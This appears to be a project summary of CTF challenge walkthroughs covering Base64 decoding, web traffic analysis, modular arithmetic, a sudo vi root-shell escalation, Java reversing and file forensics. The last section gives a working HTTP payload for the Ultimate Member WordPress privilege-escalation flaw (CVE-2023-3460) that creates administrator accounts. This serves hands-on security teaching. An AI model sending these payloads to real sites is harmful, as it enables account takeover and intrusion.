# Project Tasks Summary

This document provides an overview of various cybersecurity challenges, ranging from easy to very hard, focusing on different areas such as cryptography, web analysis, and reverse engineering. Follow the step-by-step instructions for each task to uncover the hidden flags.

## Task 1: Decoding "Repetitions"

### Objective:
Decode a Base64 encoded file, considering the possibility of multiple encoding layers.

### Steps:

1. **Download and Examine the File:**
   - Download `enc_flag` from the provided link.
   - View its contents using the command `cat enc_flag`.

2. **Identify Encoding and Decode:**
   - Note the Base64 encoding indicated by the '==' at the end.
   - Use a tool like CyberChef to decode the Base64 content.
   - Given the task's title, apply Base64 decoding multiple times until the flag is revealed.

## Task 2: Web Form Analysis "Findme"

### Objective:
Submit a form and analyze the resulting network traffic to find a flag.

### Steps:

1. **Form Submission:**
   - Access the specified website and submit the form with "test" as both username and password.

2. **Traffic Analysis:**
   - Open Chrome Developer Tools (`View > Developer > Developer Tools`), navigate to the Network tab, and enable 'Preserve Log'.
   - Observe the redirections post-submission, focusing on URL parameters, particularly `id=`.

3. **Decode and Concatenate:**
   - Decode the Base64 strings found in the `id=` parameters and concatenate them to uncover the flag.

## Task 3: Modular Arithmetic "Basic-Mod2"

### Objective:
Decrypt a message using modular arithmetic and inverse calculations.

### Steps:

1. **Acquire the Encrypted Message:**
   - Download the message from the provided link.

2. **Decryption Script:**
   - Create a script to calculate the modular inverse of each number mod 41 and map the results to a predefined character set.
   - Ensure the decrypted message follows the picoCTF flag format.

## Task 4: "Permissions" Privilege Escalation

### Objective:
Gain root access on a server to read a file located in the root directory.

### Steps:

1. **Server Login:**
   - Use the provided credentials to log in to the server.

2. **Check Permissions:**
   - Determine available commands with root access using `sudo -l`.

3. **Gain Root Access:**
   - If permitted, use `sudo vi` to open Vim with root privileges.
   - In Vim, enter command mode (`:!sh`) to spawn a root shell.

4. **Locate and Read the Flag:**
   - Navigate to the root directory, find, and read the `.flag.txt` file.

## Task 5: Reverse Engineering "Fresh Java"

### Objective:
Reverse engineer a Java program to discover the required key for a valid output.

### Steps:

1. **Decompile the Java Class:**
   - Use a Java decompiler to convert the `.class` file into readable Java code.

2. **Analyze the Decompiled Code:**
   - Review the code to understand the conditions for a valid key.

3. **Construct the Key:**
   - Based on the code analysis, construct a key that meets all the specified conditions.

## Custom Task 1: Hidden Flag in "Lost Website"

### Objective:
Find a flag hidden within the source code of a provided website.

### Steps:

1. **Inspect Website Source:**
   - Visit the given website and inspect its source code for hidden elements or comments.

2. **Discover the Flag:**
   - Locate the hidden comment containing the flag within the website's source code.

## Custom Task 2: Advanced Forensics and Decryption Challenge

### Objective:
Analyze and decode a complex file involving a mix of forensics, reverse engineering, and decryption techniques to reveal a hidden flag.

### Steps:

1. **Initial File Analysis:**
   - Download the provided file and examine its contents to identify any recognizable file signatures or patterns. Look for hexadecimal codes that might indicate the file type.
   - After 2 hours searching we found this [useful information](https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html).
     

2. **Modify and Extract File Contents:**
   - Based on your initial analysis, alter any identifiable hexadecimal codes that might be preventing normal file access. For instance, if the file starts with a recognizable file signature in hexadecimal (e.g., `50 4B` for a ZIP file), ensure it is correctly set.
   - Use `binwalk` or a similar tool to extract the contents of the modified file. The command `binwalk -e findAndFixMeV4.pdf` can be used for extraction.

3. **Analyze Extracted Content:**
   - Among the extracted contents, identify any scripts or executable files. You might find a Python script or similar, which could be encoded or obfuscated.

4. **Decoding the Script:**
   - If the script is encoded or obfuscated, carefully decode it. This may involve reversing obfuscation techniques or decoding from formats like Base64. Use the following Python `script.py` for get decocded data.

5. **Execute the Decoded Script:**
   - Run the decoded script safely in a controlled environment. The script is likely to perform operations or calculations that reveal the flag.


## Custom Task 3: Website Vulnerability Analysis

#### WPScan Results:

- URL: `https://test1.mohammadlotfi.com/`
- Vulnerabilities Identified:
  - **Robots.txt:** `/wp-admin/` and `/wp-admin/admin-ajax.php` are exposed.
  - **Ultimate Member Plugin Vulnerability:**
    - Title: Unauthenticated Privilege Escalation
    - Version Affected: < 2.6.7
    - CVE: [CVE-2023-3460](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3460)
    - Reference: [WPScan](https://wpscan.com/vulnerability/694235c7-4469-4ffd-a722-9225b19e98d7)

#### Vulnerability Description:

The Ultimate Member plugin, specifically versions lower than 2.6.7, is vulnerable to an unauthenticated privilege escalation attack. Attackers can create user accounts with arbitrary capabilities, including administrator privileges, through a POST request to the `/register/` endpoint.

#### Proof of Concept:

```http
   POST /register/ HTTP/1.1
   Host: test1.mohammadlotfi.com
   User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/114.0
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
   Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
   Accept-Encoding: gzip, deflate
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 226
   Origin: http://test1.mohammadlotfi.com
   Connection: close
   Referer: http://test1.mohammadlotfi.com/register/
   Cookie: wordpress_test_cookie=WP%20Cookie%20check; PHPSESSID=1b8518cf0ecbf8627f460b2b088024d9; wp_lang=en_US
   Upgrade-Insecure-Requests: 1

   user_login-29=pwnmemayb2e&user_password-29=P%40ssw0rd%21&confirm_user_password-29=P%40ssw0rd%21&first_name-29=Kaput&wp_cap%c3%a0Bilities-29[administrator]=1&form_id=29&um_request=&_wpnonce=cde6682afb&_wp_http_referer=%2Fregister%2F
```

#### Exploitation Plan:

1. Execute a POST request to `/register/` with crafted parameters to escalate privileges.
2. Use the following payload to create an administrator user:
```bash
   user_login-7=test8&first_name-7=test5&last_name-7=test5&user_email-7=test8%40gmail.com&user_password-7=test12345&confirm_user_password-7=test12345&form_id=7&um_request=&_wpnonce=69074dd5ff&_wp_http_referer=%2Fregister%2F&wp_cap%c3%a0Bilities-7[editor]=1
```
3. Retrieve the flag from the home page using the escalated privileges.
   - Flag Format: `cyberMo{...}`